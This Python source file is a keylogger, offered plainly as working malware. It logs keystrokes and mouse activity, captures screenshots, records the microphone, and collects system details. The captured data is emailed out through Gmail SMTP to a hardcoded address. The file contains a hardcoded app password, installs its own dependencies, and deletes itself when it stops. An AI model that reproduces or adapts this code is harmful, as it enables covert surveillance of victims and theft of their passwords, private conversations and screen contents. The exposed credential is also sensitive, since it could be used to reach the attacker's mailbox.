try:
    import logging
    import os
    import platform
    import smtplib
    import socket
    import threading
    import sounddevice as sd
    import time
    import wave
    import pyscreenshot
    import io
    import base64
    from email.mime.image import MIMEImage
    import sounddevice as sd
    from datetime import datetime

    from pynput.keyboard import Listener as KeyboardListener
    from pynput.keyboard import Key
    from pynput.mouse import Listener as MouseListener
    from email import encoders
    from email.mime.base import MIMEBase
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    import glob
except ModuleNotFoundError:
    from subprocess import call
    modules = ["pyscreenshot","sounddevice","pynput"]
    call("pip install " + ' '.join(modules), shell=True)


finally:
    EMAIL_ADDRESS = "ranachouchen4@gmail.com"
    EMAIL_PASSWORD = "hqmw jbgl ssoq ueaf"
    SEND_REPORT_EVERY = 30 # as in seconds
    class KeyLogger:
        def __init__(self, time_interval, email, password):
            self.interval = time_interval
            self.log = "KeyLogger Started..."
            self.email = email
            self.password = password
            self.is_recording = False

        def appendlog(self, string):
            self.log = self.log + string

        def on_move(self, x, y):
    # Log mouse movement with coordinates
              try:
                 timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                 self.appendlog(f"[{timestamp}] [Mouse Moved] to ({x}, {y})\n")
              except Exception as e:
                 self.appendlog(f"Error logging mouse movement: {e}\n")

        def on_click(self, x, y, button, pressed):
    # Log mouse clicks with button and status
              try:
                 timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                 action = "pressed" if pressed else "released"
                 self.appendlog(f"[{timestamp}] [Mouse {action}] at ({x}, {y}) with {button}\n")
              except Exception as e:
                 self.appendlog(f"Error logging mouse click: {e}\n")

        def on_scroll(self, x, y, dx, dy):
    # Log mouse scrolling with direction
             try:
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                self.appendlog(f"[{timestamp}] [Mouse Scrolled] at ({x}, {y}) with ({dx}, {dy})\n")
             except Exception as e:
                self.appendlog(f"Error logging mouse scroll: {e}\n")

        def save_data(self, key):
            try:
                current_key = str(key.char)
            except AttributeError:
                if key == key.space:
                    current_key = " "
                elif key == key.esc:
                    current_key = "ESC"
                elif key == Key.print_screen:  # Check for the Print Screen key
                    current_key = "PRINT_SCREEN"
                    self.screenshot()  # Trigger the screenshot method
                else:
                    current_key = " " + str(key) + " "
                # Format the log entry with a timestamp
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            self.appendlog(f"[{timestamp}] Key: {current_key}")            

        def send_mail(self, email, password, message, image=None, file_path=None):
            sender = "ranachouchen4@gmail.com"
            receiver = "ranachouchen4@gmail.com"

    # Create the email message
            msg = MIMEMultipart()
            msg['From'] = sender
            msg['To'] = receiver
            msg['Subject'] = 'Keylogger Report'

    # Attach the message content with UTF-8 encoding
            msg.attach(MIMEText(message, 'plain'))
    # If image is provided, attach it to the email
            if file_path:
              try:
                 with open(file_path, 'rb') as attachment:
                     part = MIMEBase('application', 'octet-stream')
                     part.set_payload(attachment.read())
                     encoders.encode_base64(part)
                     part.add_header(
                        'Content-Disposition',
                         f'attachment; filename="{os.path.basename(file_path)}"'
                     )
                     msg.attach(part)
                     print(f"Attached file: {file_path}")
              except Exception as e:
                     print(f"Error attaching file: {e}")
            if image:
        # Open the image in binary mode
                try:
                    image_attachment = MIMEImage(image, _subtype='png')  # Use the image bytes directly
                    image_attachment.add_header('Content-Disposition', 'attachment', filename='screenshot.png')
                    msg.attach(image_attachment)
                except Exception as e:
                    print(f"Error attaching image: {e}") 

            try:
                with smtplib.SMTP("smtp.gmail.com", 587) as server:
                   server.starttls()  # Secure connection
                   server.login(email, password)
                   server.sendmail(sender, receiver, msg.as_string())  # Send the email as a string
                   print("Email sent successfully.")
            except Exception as e:
                    print(f"Error occurred: {e}")
        def report(self):
             if self.log.strip():  # Only send email if there's new log content
                 self.send_mail(self.email, self.password, "\n\n" + self.log)
             self.log = ""  # Reset log after sending
             timer = threading.Timer(self.interval, self.report)
             timer.start()

        def system_information(self):
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            processor = platform.processor()
            system = platform.system()       
            machine = platform.machine()
            system_info = (
                 f"Hostname: {hostname}\n"
                 f"IP Address: {ip}\n"
                 f"Processor: {processor}\n"
                 f"System: {system}\n"
                 f"Machine: {machine}\n"
            )
            self.appendlog(f"\n[System Information]\n{system_info}\n")
        def record_audio(self):
         try:
            fs = 16000
            seconds = 10
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            file_path = f"audio_{timestamp}.wav"
            print(f"Recording audio at {timestamp}...")
            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
            sd.wait() # Wait until recording is finished
            with wave.open(file_path, 'wb') as obj:
              obj.setnchannels(1)  # mono
              obj.setsampwidth(2)  # 2 bytes per sample
              obj.setframerate(fs)
              obj.writeframes(myrecording.tobytes())
            self.appendlog(f"[{timestamp}] Audio recorded: {file_path}")
            threading.Timer(self.interval, self.record_audio).start()
    # Send the recorded audio via email
            self.send_mail(self.email, self.password, 'Microphone Recording', file_path=file_path)
         except Exception as e: 
              print(f"Error recording audio:{e}")
        def screenshot(self):
            img = pyscreenshot.grab()  # Capture screenshot
            img.show()
    # Convert the screenshot into bytes and send it as an attachment
            img_byte_arr = io.BytesIO()
            img.save(img_byte_arr, format='PNG')  # Save the image as PNG in a byte stream
            img_byte_arr.seek(0)  # Move cursor to the beginning of the byte stream

    # Now send the email with the screenshot as an attachment
            self.send_mail(self.email, self.password, 'Screenshot', image=img_byte_arr.getvalue())
        def run(self):
            self.record_audio()
            self.system_information()
            keyboard_listener = KeyboardListener(on_press=self.save_data)
            mouse_listener = MouseListener(
                 on_move=self.on_move,
                 on_click=self.on_click,
                 on_scroll=self.on_scroll
            )
            with keyboard_listener as kl, mouse_listener as ml:
        # Start periodic reporting
                 self.report()

        # Wait for both listeners to complete
                 kl.join()
                 ml.join()
            if os.name == "nt":
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system("cd " + pwd)
                    os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                    print('File was closed.')
                    os.system("DEL " + os.path.basename(__file__))
                except OSError:
                    print('File is close.')

            else:
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system("cd " + pwd)
                    os.system('pkill leafpad')
                    os.system("chattr -i " +  os.path.basename(__file__))
                    print('File was closed.')
                    os.system("rm -rf" + os.path.basename(__file__))
                except OSError:
                    print('File is close.')

    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()

 
